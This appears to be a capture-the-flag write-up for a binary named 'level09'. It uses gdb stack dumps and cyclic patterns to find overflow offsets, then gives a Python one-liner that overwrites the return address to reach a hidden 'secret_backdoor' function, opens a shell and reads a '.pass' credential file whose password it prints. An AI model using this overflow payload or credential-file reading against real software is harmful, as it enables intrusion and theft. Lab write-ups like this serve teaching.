level09

----- STRINGS -----

>: Msg sent!
>: Msg @Unix-Dude
>>:
>: Enter your username
>: Welcome, %s
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

----- EXEC -----

went we exec we can see the program wait for 1 username and send a message.

----- GDB -----

first time went we get in gdb we can check that contain

0x000055555555488c  secret_backdoor
0x00005555555548c0  handle_msg
0x0000555555554932  set_msg
0x00005555555549cd  set_username
0x0000555555554aa8  main

main is connected to handle_msg and handle_msg to set_username and set_msg and finally we can see another function called secret_backdoor that call system.

----- FLAG -----

----- INFO -----

En imprimant la stack après les appels aux fonctions set_username et set_msg, on peut remarquer que les entrées username et message sont copiées dans la stack.

> gdb level09

disas main

we go to check what going on the stack so we go to breakpoint the final exec

disas handle_msg

   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:	leaveq 
   0x0000555555554931 <+113>:	retq   
End of assembler dump.

> (gdb) b *0x000055555555492b
Breakpoint 2 at 0x55555555492b
On lance le programme en saisissant des entrées reconnaissables.

(gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAA
>: Welcome, AAAA
>: Msg @Unix-Dude
>>: BBBB

Breakpoint 2, 0x000055555555492b in handle_msg ()
On affiche la stack.

lets show stack memory

x/100wx $sp
0x7fffffffe500: 0x42424242      0x0000000a      0x00000000      0x00000000 <--- BBBB msg
0x7fffffffe510: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe520: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe530: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe540: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe550: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe560: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe570: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe580: 0x00000000      0x00000000      0x00000000      0x41414141 <--- AAAA username

at this point we go to remplace the adresse with the function that contain the flag secret_backdoor

so now lets check the offset from username and msg 

username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

if we check the address that save the value of username like before we can see the last type value 4 

x/50wx $sp

0x7fffffffe5b0: 0x41326241      0x00000062

so taking the last address we can check that the value is 36 (0x41326241) + 4 offset is 40.
check for the msg:

// make a point to leave from ebp register:
// rbp 0x7fffffffe5c0   0x7fffffffe5c0
// 0x7fffffffe5c0: 0x00007fffffffe5d0 0x0000555555554abd rip 
// 0x7fffffffe5c0: 0xffffe5d0      0x00007fff      0x55554abd      0x00005555 rip

x/10wx $sp
0x7fffffffe500: 0x65413265      0x34654133      0x41356541      0x65413665 <--- msg init
0x7fffffffe510: 0x38654137      0x41396541      0x66413066      0x32664131
0x7fffffffe520: 0x41336641      0x66413466
(gdb)
0x7fffffffe528: 0x36664135      0x41376641      0x66413866      0x30674139
0x7fffffffe538: 0x41316741      0x67413267      0x34674133      0x41356741
0x7fffffffe548: 0x00000a67      0x00000000
(gdb)
0x7fffffffe550: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe560: 0x00000000      0x00000000      0x55554c10      0x00005555
0x7fffffffe570: 0xffffe6b0      0x00007fff
(gdb)
0x7fffffffe578: 0xf7a95d45      0x00007fff      0xf7dd4260      0x00007fff
0x7fffffffe588: 0xf7a9608f      0x41306141      0x61413161      0x33614132
0x7fffffffe598: 0x41346141      0x61413561
(gdb)
0x7fffffffe5a0: 0x37614136      0x41386141      0x62413961      0x31624130
0x7fffffffe5b0: 0x41326241      0x00000062      0xffffe5d0      0x00007fff
0x7fffffffe5c0: 0xffffe5d0      0x00007fff
(gdb)
0x7fffffffe5c8: 0x55554abd      0x00005555      0x00000000      0x00000000 < msg finish
0x7fffffffe5d8: 0xf7a3d7ed      0x00007fff      0x00000000      0x00000000
0x7fffffffe5e8: 0xffffe6b8      0x00007fff

0x7fffffffe500 - 0x7fffffffe5c8 = 0xC8 === 200

inside the function set_msg we have an strncpy that save the msg on the stack we can see with radare that is taking:

// rax, qword [dest]
// eax, dword [rax + 0xb4]
// ; size_t n

// we can check that the dest is copy the msg dans la src, so is stock in the stack.

let made a point so we have: 

set_msg       "A" * (40 OFFSET + \xd0) 8 bytes to write the x64 address.
set_username  "B" * 200 OFFSET + secret_backdoor.

we need the secret_backdoor

> (gdb) x secret_backdoor
0x55555555488c <secret_backdoor>:	0x80c48348e5894855

exploit

> (python -c 'print "A"*40 + "\xd0" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end

cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE